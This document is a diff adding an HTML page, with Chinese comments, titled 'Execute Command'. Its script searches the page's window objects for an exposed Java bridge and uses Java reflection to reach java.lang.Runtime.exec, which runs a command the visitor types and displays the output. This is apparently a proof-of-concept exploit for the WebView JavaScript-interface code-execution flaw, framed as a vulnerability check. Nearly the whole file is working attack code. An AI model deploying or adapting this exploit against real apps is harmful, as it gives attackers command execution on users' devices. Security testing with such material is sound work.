@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Execute Command</title>
+    <script>
+        function execute(cmdArgs) {
+            let found = false; // 用于标记是否找到相关方法
+            for (let obj in window) {
+                console.log("Checking object: " + obj); // 输出当前检查的对象
+                if (window.hasOwnProperty(obj)) {
+                    const currentObj = window[obj];
+
+                    // 检查 currentObj 是否为 null
+                    if (currentObj) {
+                        // 检查 getClass 方法
+                        if (typeof currentObj.getClass === 'function') {
+                            found = true;
+                            alert("Found getClass() on object: " + obj);
+                            try {
+                                var runtimeClass = currentObj.getClass().forName("java.lang.Runtime");
+                                var p = runtimeClass.getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);
+                                show_result(p);
+                            } catch (e) {
+                                console.error("Error executing command with getClass: " + e);
+                            }
+                        }
+
+                        // 检查 getClassLoader 方法
+                        if (typeof currentObj.getClassLoader === 'function') {
+                            found = true;
+                            alert("Found getClassLoader() on object: " + obj);
+                            try {
+                                var runtimeClass = currentObj.getClassLoader().loadClass("java.lang.Runtime");
+                                var p = runtimeClass.getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);
+                                show_result(p);
+                            } catch (e) {
+                                console.error("Error executing command with getClassLoader: " + e);
+                            }
+                        }
+                    } else {
+                        console.warn("Object is null: " + obj);
+                    }
+                }
+            }
+
+            // 如果没有找到相关方法，给出提示
+            if (!found) {
+                alert("No vulnerabilities detected.");
+            }
+        }
+
+        // 处理命令执行的结果
+        function show_result(p) {
+            var inputStream = p.getInputStream();
+            var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+            var line;
+            var output = "";
+            while ((line = reader.readLine()) != null) {
+                output += line + "\n";
+            }
+            alert("Command output:\n" + output);
+        }
+
+        // 等待页面加载后执行检测
+        window.onload = function() {
+            document.getElementById("executeButton").onclick = function() {
+                var command = document.getElementById("commandInput").value;
+                execute(command);
+            };
+        };
+    </script>
+</head>
+<body>
+    <h1>Execute Command</h1>
+    <input type="text" id="commandInput" placeholder="Enter command here">
+    <button id="executeButton">Execute Command</button>
+</body>
+</html>
